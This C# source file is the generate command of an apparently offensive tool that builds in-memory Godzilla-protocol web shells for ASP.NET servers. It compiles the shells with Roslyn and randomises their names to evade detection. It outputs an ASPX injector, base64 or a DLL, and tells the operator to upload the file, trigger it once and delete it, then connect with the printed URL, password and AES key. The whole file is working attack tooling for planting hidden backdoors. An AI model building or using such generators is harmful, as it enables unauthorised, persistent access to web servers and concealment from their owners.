namespace NMG;

public class GenerateOptions
{
    public string ShellType { get; set; } = "vpp";
    public string ShellProtocol { get; set; } = "godzilla";
    public string Password { get; set; } = "";
    public string? Key { get; set; }
    public string? VirtualPath { get; set; }
    public string? Header { get; set; }
    public string TargetFramework { get; set; } = "net40";
    public string OutputFormat { get; set; } = "aspx";
    public int? Seed { get; set; }
    public string? OutputFile { get; set; }
}

public static class GenerateCommand
{
    public static int Run(string[] args)
    {
        var opts = new GenerateOptions();

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i].ToLowerInvariant())
            {
                case "--type": opts.ShellType = NextArg(args, ref i, "--type"); break;
                case "--shell": opts.ShellProtocol = NextArg(args, ref i, "--shell"); break;
                case "--pass": opts.Password = NextArg(args, ref i, "--pass"); break;
                case "--key": opts.Key = NextArg(args, ref i, "--key"); break;
                case "--path": opts.VirtualPath = NextArg(args, ref i, "--path"); break;
                case "--header": opts.Header = NextArg(args, ref i, "--header"); break;
                case "--target": opts.TargetFramework = NextArg(args, ref i, "--target"); break;
                case "--format": opts.OutputFormat = NextArg(args, ref i, "--format"); break;
                case "--seed": opts.Seed = int.Parse(NextArg(args, ref i, "--seed")); break;
                case "-o": opts.OutputFile = NextArg(args, ref i, "-o"); break;
                default:
                    Console.Error.WriteLine($"Unknown option: {args[i]}");
                    return 1;
            }
        }

        if (string.IsNullOrEmpty(opts.Password))
        {
            Console.Error.WriteLine("Error: --pass is required");
            return 1;
        }

        var validTypes = new[] { "vpp", "route", "httplistener" };
        if (!validTypes.Contains(opts.ShellType))
        {
            Console.Error.WriteLine($"Error: --type '{opts.ShellType}' not supported. Valid: {string.Join(", ", validTypes)}");
            return 1;
        }

        if (opts.ShellProtocol != "godzilla")
        {
            Console.Error.WriteLine($"Error: --shell '{opts.ShellProtocol}' not implemented. Only 'godzilla' is supported.");
            return 1;
        }

        string key = opts.Key ?? DeriveKey(opts.Password);
        var rng = new Randomizer.SeedRandom(opts.Seed);
        string ns = rng.NextNamespace();
        string cls = rng.NextClassName();
        string virtualPath = opts.VirtualPath ?? rng.NextVirtualPath();

        Console.WriteLine($"[+] namespace: {ns}");
        Console.WriteLine($"[+] class:     {cls}");
        Console.WriteLine($"[+] path:      {virtualPath}");
        Console.WriteLine($"[+] key:       {key}");

        string source = RenderTemplate(opts, ns, cls, key, virtualPath);
        Console.WriteLine("[+] template rendered");

        var compiler = new Compiler.RoslynCompiler();
        var (success, dllBytes, diags) = compiler.Compile(source, opts.TargetFramework);
        if (!success)
        {
            Console.Error.WriteLine("[!] Compilation failed:");
            foreach (var d in diags)
                Console.Error.WriteLine($"    {d}");
            return 1;
        }
        Console.WriteLine($"[+] compiled:  {dllBytes.Length} bytes ({opts.TargetFramework})");

        string? output = null;
        switch (opts.OutputFormat.ToLowerInvariant())
        {
            case "aspx":
                output = Formats.AspxInjector.Wrap(dllBytes, ns, cls);
                break;
            case "b64":
                output = Formats.Base64Output.Wrap(dllBytes);
                break;
            case "dll":
                if (string.IsNullOrEmpty(opts.OutputFile))
                {
                    Console.Error.WriteLine("Error: --format dll requires -o output path");
                    return 1;
                }
                File.WriteAllBytes(opts.OutputFile, dllBytes);
                break;
            default:
                Console.Error.WriteLine($"Error: unknown format '{opts.OutputFormat}'");
                return 1;
        }

        if (output != null)
        {
            if (string.IsNullOrEmpty(opts.OutputFile))
                Console.WriteLine(output);
            else
                File.WriteAllText(opts.OutputFile, output);
        }

        if (opts.OutputFile != null)
            Console.WriteLine($"[+] payload: {Path.GetFullPath(opts.OutputFile)}  (type={opts.ShellType}, shell={opts.ShellProtocol}, target={opts.TargetFramework})");
        Console.WriteLine("[+] upload and access once to trigger injection, then delete the file");
        Console.WriteLine("[+] Godzilla connection:");
        Console.WriteLine($"    URL:    http://<target>/{virtualPath.TrimStart('/')}");
        Console.WriteLine($"    Pass:   {opts.Password}");
        Console.WriteLine($"    Key:    {key}");
        Console.WriteLine($"    Enc:    AES-128 (default)");
        Console.WriteLine($"    Type:   C#");
        return 0;
    }

    static string NextArg(string[] args, ref int index, string name)
    {
        index++;
        if (index >= args.Length)
        {
            Console.Error.WriteLine($"Error: {name} requires a value");
            Environment.Exit(1);
        }
        return args[index];
    }

    static string DeriveKey(string password)
    {
        using var md5 = System.Security.Cryptography.MD5.Create();
        byte[] hash = md5.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password));
        return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant()[..16];
    }

    static string RenderTemplate(GenerateOptions opts, string ns, string cls, string key, string virtualPath)
    {
        string quotedPass = "\"" + opts.Password.Replace("\"", "\\\"") + "\"";
        string quotedKey = "\"" + key.Replace("\"", "\\\"") + "\"";

        string members = Shells.GodzillaCSharp.MembersBlock
            .Replace("{{PASSWORD}}", quotedPass)
            .Replace("{{KEY}}", quotedKey);

        string trigger = Shells.GodzillaCSharp.TriggerBlock
            .Replace("{{PASSWORD}}", quotedPass)
            .Replace("{{KEY}}", quotedKey);

        string randomStr = Shells.GodzillaCSharp.RandomStringBlock;

        string template = opts.ShellType switch
        {
            "vpp" => Templates.VppTemplate.Source,
            "route" => Templates.RouteTemplate.Source,
            "httplistener" => Templates.HttpListenerTemplate.Source,
            _ => throw new NotSupportedException(opts.ShellType)
        };

        return template
            .Replace("{{NAMESPACE}}", ns)
            .Replace("{{CLASSNAME}}", cls)
            .Replace("{{MEMBERS}}", members)
            .Replace("{{TRIGGER_BLOCK}}", trigger)
            .Replace("{{RANDOM_STRING}}", randomStr)
            .Replace("{{LISTENER_URL}}", opts.Header ?? "http://*:80/godzilla/");
    }
}
